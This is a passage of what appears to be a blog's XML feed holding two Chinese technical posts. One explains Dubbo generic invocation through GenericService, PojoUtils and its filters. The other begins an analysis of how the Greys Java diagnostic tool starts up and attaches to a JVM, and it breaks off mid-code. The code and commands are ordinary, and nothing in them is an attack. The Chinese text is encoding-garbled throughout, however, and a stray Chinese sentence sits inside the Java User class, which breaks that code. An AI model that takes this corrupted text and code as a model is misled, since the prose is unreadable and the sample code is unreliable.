      <content type="html"><![CDATA[<h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><blockquote>
<p>æ³›æ¥å£è°ƒç”¨æ–¹å¼ä¸»è¦ç”¨äºå®¢æˆ·ç«¯æ²¡æœ‰APIæ¥å£åŠæ¨¡å‹ç±»å…ƒçš„æƒ…å†µï¼Œå‚æ•°åŠè¿”å›å€¼ä¸­çš„æ‰€æœ‰POJOå‡ç”¨Mapè¡¨ç¤ºï¼Œé€šå¸¸ç”¨äºæ¡†æ¶é›†æˆï¼Œæ¯”å¦‚ï¼šå®ç°ä¸€ä¸ªé€šç”¨çš„æœåŠ¡æµ‹è¯•æ¡†æ¶ï¼Œå¯é€šè¿‡GenericServiceè°ƒç”¨æ‰€æœ‰æœåŠ¡å®ç°ã€‚</p>
</blockquote>
<p>æˆªå›¾ä¸ºqunarçš„dubboæœåŠ¡æµ‹è¯•æ¡†æ¶, åªéœ€å°†å‚æ•°æŒ‰ç…§æŒ‡å®šçš„æ ¼å¼å¡«å…¥, å°±å¯ä»¥ç›´æ¥è°ƒç”¨ç›¸åº”çš„dubboæ¥å£.</p>
<img src="/2018/05/02/dubbo-generic-invoke/generic.png" title="é€šè¿‡æ³›åŒ–è°ƒç”¨æ‰‹å·¥å‘èµ·dubboè¯·æ±‚">
<h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><p>æ³›åŒ–è°ƒç”¨éœ€è¦æ¥å£å£°æ˜ä¸ºæ³›åŒ–, å¯ä»¥åœ¨å£°æ˜æ¥å£çš„æ—¶å€™æŒ‡å®š,</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dubbo:reference</span> <span class="attr">id</span>=<span class="string">"barService"</span> <span class="attr">interface</span>=<span class="string">"com.foo.BarService"</span> <span class="attr">generic</span>=<span class="string">"true"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>ä¹Ÿå¯ä»¥åœ¨ä»£ç ä¸­è¿›è¡Œè®¾ç½®:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ReferenceConfig&lt;GenericService&gt; reference = <span class="keyword">new</span> ReferenceConfig&lt;GenericService&gt;();</span><br><span class="line">reference.setApplication(<span class="keyword">new</span> ApplicationConfig(<span class="string">"generic-consumer"</span>));</span><br><span class="line">reference.setInterface(DemoService<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">reference.setUrl(<span class="string">"dubbo://127.0.0.1:29581?scope=remote"</span>);</span><br><span class="line"><span class="comment">// å£°æ˜ä¸ºæ³›åŒ–</span></span><br><span class="line">reference.setGeneric(<span class="keyword">true</span>);</span><br><span class="line">GenericService genericService = reference.get();</span><br></pre></td></tr></table></figure>
<p>ç„¶åå°±å¯ä»¥ä½¿ç”¨æ³›åŒ–è°ƒç”¨çš„æ–¹å¼å»è°ƒç”¨æ¥å£äº†</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Map&lt;String, Object&gt;&gt; users = <span class="keyword">new</span> ArrayList&lt;Map&lt;String, Object&gt;&gt;();</span><br><span class="line">Map&lt;String, Object&gt; user = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">user.put(<span class="string">"class"</span>, <span class="string">"com.alibaba.dubbo.config.api.User"</span>);</span><br><span class="line">user.put(<span class="string">"name"</span>, <span class="string">"actual.provider"</span>);</span><br><span class="line">users.add(user);</span><br><span class="line"><span class="comment">// æ³›åŒ–è°ƒç”¨</span></span><br><span class="line">users = (List&lt;Map&lt;String, Object&gt;&gt;) genericService.$invoke("getUsers", new String[] &#123;List.class.getName()&#125;, new Object[] &#123;users&#125;);</span><br><span class="line">Assert.assertEquals(<span class="number">1</span>, users.size());</span><br><span class="line">Assert.assertEquals(<span class="string">"actual.provider"</span>, users.get(<span class="number">0</span>).get(<span class="string">"name"</span>));</span><br></pre></td></tr></table></figure>
<h2 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h2><p>æ³›åŒ–è°ƒç”¨æ˜¯é€šè¿‡dubboçš„filteræœºåˆ¶å®ç°çš„, å¤§æ¦‚æµç¨‹å¦‚ä¸‹:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">+-------------------------------------------+               +-------------------------------------------+</span><br><span class="line">|  consumer ç«¯                               |               | provider ç«¯                                |</span><br><span class="line">|                                           |               |                                           |</span><br><span class="line">|                                           |               |                                           |</span><br><span class="line">|                                           |               |                                           |</span><br><span class="line">|                                           |               |                                           |</span><br><span class="line">|                    +------------------+   |               |       +--------------+                    |</span><br><span class="line">|                    |GenericImplFilter |   |  Invocation   |       |GenericFilter |                    |</span><br><span class="line">|             +----&gt; |                  +-------------------------&gt; |              |                    |</span><br><span class="line">|             |      +------------------+   |               |       +--------------+                    |</span><br><span class="line">| +-----------+                             |               |                      |    +-----------+   |</span><br><span class="line">| |           |                             |               |                      |    |           |   |</span><br><span class="line">| |Client     |                             |               |                      +--&gt; | Service   |   |</span><br><span class="line">| |           |                             |               |                           |           |   |</span><br><span class="line">| +-----------+                             |               |                           +-------+---+   |</span><br><span class="line">|                                           |               |                                   |       |</span><br><span class="line">|      ^             +------------------+   |               |       +--------------+            |       |</span><br><span class="line">|      |             |GenericImplFilter |   |               |       |GenericFilter | &lt;----------+       |</span><br><span class="line">|      +-------------+                  | &lt;-------------------------+              |                    |</span><br><span class="line">|                    +------------------+   |               |       +--------------+                    |</span><br><span class="line">|                                           |               |                                           |</span><br><span class="line">|                                           |               |                                           |</span><br><span class="line">|                                           |               |                                           |</span><br><span class="line">|                                           |               |                                           |</span><br><span class="line">+-------------------------------------------+               +-------------------------------------------+</span><br></pre></td></tr></table></figure>
<h3 id="GenericService"><a href="#GenericService" class="headerlink" title="GenericService"></a>GenericService</h3><p><code>GenericService</code>è¿™ä¸ªæ¥å£å’Œjavaçš„åå°„è°ƒç”¨éå¸¸åƒ, åªéœ€æä¾›è°ƒç”¨çš„æ–¹æ³•åç§°,  å‚æ•°çš„ç±»å‹ä»¥åŠå‚æ•°çš„å€¼å°±å¯ä»¥ç›´æ¥è°ƒç”¨å¯¹åº”æ–¹æ³•äº†.</p>
<p>æ¥å£çš„å®ç°å¦‚ä¸‹:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.alibaba.dubbo.rpc.service;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * é€šç”¨æœåŠ¡æ¥å£</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> william.liangf</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@export</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">GenericService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ³›åŒ–è°ƒç”¨</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> method æ–¹æ³•åï¼Œå¦‚ï¼šfindPersonï¼Œå¦‚æœæœ‰é‡è½½æ–¹æ³•ï¼Œéœ€å¸¦ä¸Šå‚æ•°åˆ—è¡¨ï¼Œå¦‚ï¼šfindPerson(java.lang.String)</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> parameterTypes å‚æ•°ç±»å‹</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args å‚æ•°åˆ—è¡¨</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> è¿”å›å€¼</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Throwable æ–¹æ³•æŠ›å‡ºçš„å¼‚å¸¸</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Object $invoke(String method, String[] parameterTypes, Object[] args) <span class="keyword">throws</span> GenericException;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="PojoUtils"><a href="#PojoUtils" class="headerlink" title="PojoUtils"></a>PojoUtils</h3><blockquote>
<p>PojoUtils. Travel object deeply, and convert complex type to simple type.</p>
</blockquote>
<p>simple typeåŒ…å«primitive type, String, Number(Integer, Long), Date, Array of Primitive type, collectionç­‰</p>
<p>ä¸¾ä¸€ä¸ªç®€å•çš„ä¾‹å­, javaç±»Userå®šä¹‰å¦‚ä¸‹:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span>  <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span>  String name;</span><br><span class="line">    <span class="keyword">private</span> Date birthDay;</span><br><span class="line">    <span class="keyword">private</span> Address address;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(<span class="keyword">int</span> age, String name, Date birthDay)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.birthDay = birthDay;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Date <span class="title">getBirthDay</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> birthDay;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBirthDay</span><span class="params">(Date birthDay)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.birthDay = birthDay;</span><br><span class="line">    &#125;</span><br><span class="line">å°†hashmapç»“æ„çš„å‚æ•°è½¬æ¢æˆå¯¹åº”çš„pojo</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Address <span class="title">getAddress</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAddress</span><span class="params">(Address address)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.address = address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ReflectionToStringBuilder.toString(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;ï¿¼ï¿¼ ï¿¼ ï¿¼ ï¿¼ ï¿¼ ï¿¼ï¿¼</span><br></pre></td></tr></table></figure>
<p>åºåˆ—åŒ–ä»£ç :</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Object generalized = PojoUtils.generalize(user);</span><br><span class="line"> System.out.println(<span class="string">"generalized = "</span> + JSON.toJSONString(generalized));</span><br></pre></td></tr></table></figure>
<p>generalizeä¹‹åå…¶å®æ˜¯ä¸€ä¸ª<code>hashmap</code>, å†™æˆjsonå­—ç¬¦ä¸²ä¹‹åå¦‚ä¸‹:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;birthDay&quot;: 1525258281516,</span><br><span class="line">    &quot;address&quot;: &#123;</span><br><span class="line">        &quot;zipCode&quot;: 10086,</span><br><span class="line">        &quot;street&quot;: &quot;haidian street&quot;,</span><br><span class="line">        &quot;class&quot;: &quot;com.air.rmi.dubbo.bean.Address&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;name&quot;: &quot;Kevin&quot;,</span><br><span class="line">    &quot;class&quot;: &quot;com.air.rmi.dubbo.bean.User&quot;,</span><br><span class="line">    &quot;age&quot;: 26</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="ç›¸å…³filters"><a href="#ç›¸å…³filters" class="headerlink" title="ç›¸å…³filters"></a>ç›¸å…³filters</h3><ul>
<li><code>GenericFilter</code>: è´Ÿè´£providerç«¯å‚æ•°çš„è½¬æ¢.</li>
</ul>
<ol>
<li>è°ƒç”¨æ—¶,å°†hashmapç»“æ„çš„å‚æ•°è½¬æ¢æˆå¯¹åº”çš„pojo</li>
<li>è¿”å›ç»“æœæ—¶, å°†pojoè½¬æ¢æˆhashmap</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è°ƒç”¨æ—¶</span></span><br><span class="line">args = PojoUtils.realize(args, params, method.getGenericParameterTypes()</span><br><span class="line"><span class="comment">// è¿”å›ç»“æœæ—¶</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> RpcResult(PojoUtils.generalize(result.getValue()));</span><br></pre></td></tr></table></figure>
<ul>
<li><code>GenericImplFilter</code>: è´Ÿè´£consumerç«¯å‚æ•°çš„è½¬æ¢, å°†POJOè½¬æ¢æˆhashmapç»“æ„</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object[] args = PojoUtils.generalize(arguments);</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·consumerç«¯ä¼ è¿‡æ¥çš„åªæ˜¯ä¸€ä¸ªmap, å¹¶ä¸è¦æœ‰providerç«¯çš„jaråŒ…, æ ¹æ®è¿™ä¸ªå°±å¯ä»¥å®ç°dubboæ¥å£çš„æµ‹è¯•å¹³å°.</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul>
<li><a href="https://dubbo.incubator.apache.org/books/dubbo-user-book/demos/generic-reference.html" rel="external nofollow noopener noreferrer" target="_blank">6.16 æ³›åŒ–å¼•ç”¨ Â· GitBook</a></li>
<li><a href="https://www.jianshu.com/p/ff0947529de4" rel="external nofollow noopener noreferrer" target="_blank">Dubboé«˜çº§ç‰¹æ€§å®è·µ-æ³›åŒ–è°ƒç”¨ - ç®€ä¹¦</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/29410596" rel="external nofollow noopener noreferrer" target="_blank">dubboé«˜çº§ç”¨æ³•ä¹‹æ³›åŒ–ä¸æ¥å£è‡ªé€‚åº”</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> dubbo </category>
            
        </categories>
        
        
        <tags>
            
            <tag> generic </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[greyså¯åŠ¨åˆ†æ]]></title>
      <url>http://qsli.github.io/2018/04/02/greys-start/</url>
      <content type="html"><![CDATA[<h1 id="greys-ç®€ä»‹"><a href="#greys-ç®€ä»‹" class="headerlink" title="greys ç®€ä»‹"></a>greys ç®€ä»‹</h1><p>greysçš„ä½¿ç”¨å‚è§é“¾æ¥ï¼š <a href="/2017/11/12/greys/" title="ä½¿ç”¨greysæ¥æ’æŸ¥çº¿ä¸Šé—®é¢˜">ä½¿ç”¨greysæ¥æ’æŸ¥çº¿ä¸Šé—®é¢˜</a></p>
<h1 id="greys-sh"><a href="#greys-sh" class="headerlink" title="greys.sh"></a>greys.sh</h1><p>ä¸€èˆ¬ä½¿ç”¨greysæ—¶ï¼Œå¯åŠ¨å‘½ä»¤å¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u tomcat -H ./greys.sh [pid]</span><br></pre></td></tr></table></figure>
<p><code>greys.sh</code>çš„æœ€åä¸€è¡Œ<code>main &quot;${@}&quot;</code>å°†å‘½ä»¤è¡Œçš„æ‰€æœ‰å‚æ•°éƒ½ä¼ ç»™äº†mainå‡½æ•°ï¼Œ çœ‹mainå‡½æ•°çš„å®ç°ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="built_in">getopts</span> <span class="string">"PUJC"</span> ARG</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="keyword">case</span> <span class="variable">$&#123;ARG&#125;</span> <span class="keyword">in</span></span><br><span class="line">        P) OPTION_CHECK_PERMISSION=0;;</span><br><span class="line">        U) OPTION_UPDATE_IF_NECESSARY=0;;</span><br><span class="line">        J) OPTION_ATTACH_JVM=0;;</span><br><span class="line">        C) OPTION_ACTIVE_CONSOLE=0;;</span><br><span class="line">        ?) usage;<span class="built_in">exit</span> 1;;</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆè„šæœ¬ä½¿ç”¨<code>getopts</code>æ¥è·å–å‘½ä»¤è¡Œçš„å‚æ•°ï¼Œ æŒ‡å®šè§£æ<code>-P</code>ã€<code>-U</code>ã€<code>-J</code>ã€<code>-C</code>è¿™å‡ ä¸ªå‚æ•°ï¼Œè®¾ç½®ä¸€äº›flagã€‚<br>æ³¨æ„ä¸‹caseè¯­å¥ä¸­çš„<code>ï¼Ÿ</code>ï¼Œ ä»£è¡¨æ— æ³•è¯†åˆ«çš„å‘½ä»¤è¡Œå‚æ•°, è¿™æ—¶å°±æ‰“å°å‡ºhelpï¼Œç„¶åé€€å‡ºç¨‹åºï¼š</p>
<blockquote>
<p>The GNU getopt command uses the GNU getopt() library function to do the parsing of the arguments and options.</p>
</blockquote>
<blockquote>
<p>If getopt() does not recognize an option character, it prints an error message to stderr, stores the character in optopt, and returns ?. The calling program may prevent the error message by setting opterr to 0.</p>
</blockquote>
<p>ç„¶ågreys.shè¿™ä¸ªè„šæœ¬ä¼šæ£€æŸ¥greysçš„ç‰ˆæœ¬æ˜¯å¦æœ‰æ›´æ–°ï¼Œ é™¤äº†æ£€æŸ¥æ›´æ–°å°±æ˜¯<code>attach jvm</code>å’Œ<code>active console</code>ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [[ <span class="variable">$&#123;OPTION_ATTACH_JVM&#125;</span> -eq 1 ]]; <span class="keyword">then</span></span><br><span class="line">    attach_jvm <span class="variable">$&#123;greys_local_version&#125;</span>\</span><br><span class="line">        || exit_on_err 1 <span class="string">"attach to target jvm(<span class="variable">$&#123;TARGET_PID&#125;</span>) failed."</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$&#123;OPTION_ACTIVE_CONSOLE&#125;</span> -eq 1 ]]; <span class="keyword">then</span></span><br><span class="line">    active_console <span class="variable">$&#123;greys_local_version&#125;</span>\</span><br><span class="line">        || exit_on_err 1 <span class="string">"active console failed."</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p><code>${OPTION_ATTACH_JVM}</code>å’Œ<code>${OPTION_ACTIVE_CONSOLE}</code>çš„é»˜è®¤å€¼éƒ½æ˜¯1ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># the option to control greys.sh attach target jvm</span></span><br><span class="line">OPTION_ATTACH_JVM=1</span><br><span class="line"></span><br><span class="line"><span class="comment"># the option to control greys.sh active greys-console</span></span><br><span class="line">OPTION_ACTIVE_CONSOLE=1</span><br></pre></td></tr></table></figure>
<h1 id="attach-jvmåˆ†æ"><a href="#attach-jvmåˆ†æ" class="headerlink" title="attach jvmåˆ†æ"></a>attach jvmåˆ†æ</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">attach_jvm()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">local</span> greys_lib_dir=<span class="variable">$&#123;GREYS_LIB_DIR&#125;</span>/<span class="variable">$&#123;1&#125;</span>/greys</span><br><span class="line"></span><br><span class="line">    <span class="comment"># if [ $&#123;TARGET_IP&#125; = $&#123;DEFAULT_TARGET_IP&#125; ]; then</span></span><br><span class="line">    <span class="keyword">if</span> [ ! -z <span class="variable">$&#123;TARGET_PID&#125;</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="variable">$&#123;JAVA_HOME&#125;</span>/bin/java \</span><br><span class="line">            <span class="variable">$&#123;BOOT_CLASSPATH&#125;</span> <span class="variable">$&#123;JVM_OPTS&#125;</span> \</span><br><span class="line">            -jar <span class="variable">$&#123;greys_lib_dir&#125;</span>/greys-core.jar \</span><br><span class="line">                -pid <span class="variable">$&#123;TARGET_PID&#125;</span> \</span><br><span class="line">                -target <span class="variable">$&#123;TARGET_IP&#125;</span><span class="string">":"</span><span class="variable">$&#123;TARGET_PORT&#125;</span> \</span><br><span class="line">                -core <span class="string">"<span class="variable">$&#123;greys_lib_dir&#125;</span>/greys-core.jar"</span> \</span><br><span class="line">                -agent <span class="string">"<span class="variable">$&#123;greys_lib_dir&#125;</span>/greys-agent.jar"</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>attach jvmè¿™ä¸ªå‡½æ•°ï¼Œå°±æ˜¯è°ƒç”¨ greys-coreè¿™ä¸ªjaråŒ…ï¼Œ  jaråŒ…æ‰§è¡Œæ—¶ä¼šè°ƒç”¨æŒ‡å®šçš„<code>Main-Class</code>çš„çš„mainæ–¹æ³•ã€‚<br><code>Main-Class</code>åœ¨<code>META-INF</code>ä¸­æŒ‡å®šï¼Œ æŸ¥çœ‹æ–‡ä»¶çš„å†…å®¹:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">âœ  greys  unzip -q -c greys-core.jar  META-INF/MANIFEST.MF</span><br><span class="line">Manifest-Version: 1.0</span><br><span class="line">Archiver-Version: Plexus Archiver</span><br><span class="line">Created-By: Apache Maven</span><br><span class="line">Built-By: vlinux</span><br><span class="line">Build-Jdk: 1.8.0_91</span><br><span class="line">Main-Class: com.github.ompc.greys.core.GreysLauncher</span><br></pre></td></tr></table></figure>
<p>å› æ­¤æ‰§è¡Œè¿™ä¸ªjaråŒ…åï¼Œä¼šè°ƒç”¨<code>GreysLauncher</code>çš„mainæ–¹æ³•ã€‚</p>
<h2 id="attachåˆ°jvmè¿‡ç¨‹"><a href="#attachåˆ°jvmè¿‡ç¨‹" class="headerlink" title="attachåˆ°jvmè¿‡ç¨‹"></a>attachåˆ°jvmè¿‡ç¨‹</h2><p><code>GreysLauncher</code>åœ¨mainå‡½æ•°ä¸­åšäº†ä¸¤ä»¶äº‹æƒ…ï¼Œä¸€æ˜¯è§£æå‘½ä»¤è¡Œé…ç½®ï¼Œ äºŒæ˜¯attachåˆ°å…·ä½“çš„jvmä¸Šã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> GreysLauncher(args);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">        System.err.println(<span class="string">"start greys failed, because : "</span> + getCauseMessage(t));</span><br><span class="line">        System.exit(-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">GreysLauncher</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è§£æé…ç½®æ–‡ä»¶</span></span><br><span class="line">    Configure configure = analyzeConfigure(args);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åŠ è½½agent</span></span><br><span 